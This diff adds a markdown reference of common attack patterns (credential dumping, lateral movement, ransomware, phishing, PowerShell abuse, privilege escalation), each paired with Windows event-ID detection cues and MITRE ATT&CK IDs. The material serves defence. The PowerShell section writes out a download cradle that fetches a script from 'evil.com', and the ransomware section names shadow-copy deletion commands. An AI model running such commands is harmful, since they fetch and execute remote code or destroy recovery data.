@@ -1,0 +1,126 @@
+## Credential Dumping Attack Pattern
+
+Credential dumping is the process of obtaining account login and password information from the operating system or software. Credentials can then be used to perform lateral movement and access restricted information.
+
+Common techniques:
+- LSASS Memory Dump: Attackers use tools like Mimikatz, ProcDump, or Task Manager to dump the LSASS process memory, which contains hashed and plaintext credentials.
+- SAM Database: The Security Account Manager (SAM) database stores local account passwords. Attackers extract it using reg save or Volume Shadow Copy.
+- DCSync: Attackers impersonate a domain controller to request password data via replication (MS-DRSR protocol).
+- Kerberoasting: Requesting TGS tickets for service accounts, then offline brute-forcing the service account password.
+- NTDS.dit: The Active Directory database file containing all domain credentials. Extracted via Volume Shadow Copy or ntdsutil.
+
+Detection:
+- Windows Event ID 4688: Process creation (look for mimikatz, procdump, secretsdump)
+- Windows Event ID 4672: Special privileges assigned (sensitive privilege use)
+- Windows Event ID 4624: Logon events with unusual patterns
+- Sysmon Event ID 10: Process access to LSASS
+- Windows Event ID 4662: Directory service access (DCSync detection)
+
+MITRE ATT&CK: T1003 (OS Credential Dumping)
+
+## Lateral Movement Attack Pattern
+
+Lateral movement refers to techniques adversaries use to move through a network after gaining initial access. The goal is to reach high-value targets and maintain persistence.
+
+Common techniques:
+- Pass-the-Hash (PtH): Using stolen NTLM hashes to authenticate without knowing the password.
+- Pass-the-Ticket (PtT): Using stolen Kerberos tickets to authenticate.
+- Remote Desktop Protocol (RDP): Using stolen credentials to RDP to other systems.
+- PsExec/SMB: Remote command execution via SMB named pipes.
+- WMI/WinRM: Remote management protocols for command execution.
+- SSH: Lateral movement in Linux/Unix environments.
+
+Detection:
+- Windows Event ID 4624: Logon Type 3 (network) from unusual sources
+- Windows Event ID 4648: Explicit credential logon
+- Windows Event ID 5140: Network share access
+- Windows Event ID 7045: New service installed (PsExec)
+- Unusual RDP connections (Event ID 1149)
+- Network traffic anomalies between workstations
+
+MITRE ATT&CK: T1021 (Remote Services), T1550 (Use Alternate Authentication Material)
+
+## Ransomware Attack Pattern
+
+Ransomware is malware that encrypts victim files and demands payment for decryption. Modern ransomware often includes data exfiltration (double extortion).
+
+Attack lifecycle:
+1. Initial Access: Phishing, RDP brute-force, exploitation of public-facing apps
+2. Execution: PowerShell, cmd, WMI for payload execution
+3. Persistence: Scheduled tasks, registry run keys, services
+4. Discovery: Network scanning, AD enumeration (BloodHound/SharpHound)
+5. Lateral Movement: PsExec, RDP, WMI for spreading
+6. Collection: Staging data for exfiltration
+7. Exfiltration: Uploading stolen data to attacker infrastructure
+8. Impact: File encryption, Volume Shadow Copy deletion, ransom note deployment
+
+Detection:
+- Mass file modification events
+- Volume Shadow Copy deletion (vssadmin delete shadows)
+- bcdedit /set commands (disabling recovery)
+- Unusual file extensions appearing en masse
+- Network connections to known C2 infrastructure
+- PowerShell with encoded commands
+
+MITRE ATT&CK: T1486 (Data Encrypted for Impact), T1490 (Inhibit System Recovery)
+
+## Phishing Attack Pattern
+
+Phishing is a social engineering technique where attackers send fraudulent messages to trick victims into revealing credentials or executing malware.
+
+Types:
+- Spearphishing Attachment: Targeted email with malicious attachment (macro-enabled docs, executables)
+- Spearphishing Link: Email containing link to credential harvesting page or exploit kit
+- Business Email Compromise (BEC): Impersonating executives to authorize fraudulent transfers
+- Whaling: Targeting high-profile individuals (C-suite, admins)
+
+Detection:
+- Email gateway alerts for suspicious attachments
+- URL reputation checks
+- Sandbox detonation of attachments
+- User-reported phishing
+- Unusual Office process behavior (macro execution)
+- PowerShell spawned from Office applications
+
+MITRE ATT&CK: T1566 (Phishing)
+
+## PowerShell-based Attack Pattern
+
+PowerShell is frequently abused by attackers due to its power and ubiquity on Windows systems.
+
+Common malicious uses:
+- Download Cradle: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
+- Encoded Commands: powershell -enc [base64]
+- AMSI Bypass: Disabling Antimalware Scan Interface
+- Constrained Language Mode Bypass: Escaping PowerShell restrictions
+- Living off the Land: Using built-in cmdlets for reconnaissance and lateral movement
+- Fileless Malware: In-memory execution without touching disk
+
+Detection:
+- Windows Event ID 4104: Script Block Logging (captures full script content)
+- Windows Event ID 4103: Module Logging
+- Sysmon Event ID 1: Process creation with PowerShell
+- Look for: -enc, -encoded, IEX, Invoke-Expression, Net.WebClient, DownloadString, bypass
+
+MITRE ATT&CK: T1059.001 (PowerShell)
+
+## Privilege Escalation Attack Pattern
+
+Privilege escalation allows attackers to gain higher-level permissions on a system or network.
+
+Windows techniques:
+- Token Impersonation: Stealing tokens from higher-privileged processes
+- DLL Hijacking: Placing malicious DLLs in search path
+- Unquoted Service Paths: Exploiting spaces in service binary paths
+- AlwaysInstallElevated: MSI installer privilege escalation
+- Kernel Exploits: CVE exploitation for SYSTEM access
+- UAC Bypass: Circumventing User Account Control
+
+Detection:
+- Windows Event ID 4672: Special privileges assigned
+- Windows Event ID 4673: Privileged service called
+- Windows Event ID 4688: Process creation with elevated token
+- Unusual parent-child process relationships
+- Services running as SYSTEM with writable paths
+
+MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation), T1134 (Access Token Manipulation)
